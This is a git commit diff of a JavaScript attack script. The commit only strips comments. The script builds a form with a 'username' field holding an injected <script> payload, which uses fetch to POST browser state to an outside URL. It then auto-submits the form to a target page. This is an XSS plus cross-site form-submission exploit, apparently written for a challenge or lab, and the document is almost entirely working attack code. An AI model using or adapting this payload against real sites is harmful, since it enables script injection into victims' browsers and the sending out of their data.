52effd79c81ecfe9d0b1edd39f22589e014f6d4c
nyzra <sauronlucas@gmail.com>
2024-06-22 12:34:39 +0200

    changed script

--- script.js
+++ script.js
@@ -4,30 +4,28 @@ let nullOpener = window.opener == null ? "yes":"non"
 let payload={
     username :`<script>const url = ${url};
 
-    // Define the data you want to send in the POST request
     const data = {
         nullOpener: "${nullOpener}",
     };
     
-    // Use the fetch API to send the POST request
     fetch(url, {
-      method: 'POST', // Specify the request method as POST
+      method: 'POST',
       headers: {
-        'Content-Type': 'application/json' // Set the content type to JSON
+        'Content-Type': 'application/json'
       },
-      body: JSON.stringify(data) // Convert the data object to a JSON string
+      body: JSON.stringify(data) 
     })
     .then(response => {
       if (!response.ok) {
         throw new Error('Network response was not ok ' + response.statusText);
       }
-      return response.json(); // Parse the JSON response
+      return response.json();
     })
     .then(data => {
-      console.log('Success:', data); // Handle the response data
+      console.log('Success:', data); 
     })
     .catch(error => {
-      console.error('There was a problem with the fetch operation:', error); // Handle any errors
+      console.error('There was a problem with the fetch operation:', error);
     });</script>`,
     secret: "aa",
 }
@@ -39,8 +37,8 @@ for (const key of Object.keys(payload)) {
     var input = document.createElement('input');
     input.name = key;
     input.value = payload[key];
-    form.appendChild(input); // add key/value pair to form
+    form.appendChild(input);
   }
-  document.body.appendChild(form); // forms cannot be submitted outside of body
+  document.body.appendChild(form); 
   form.submit(); 
 
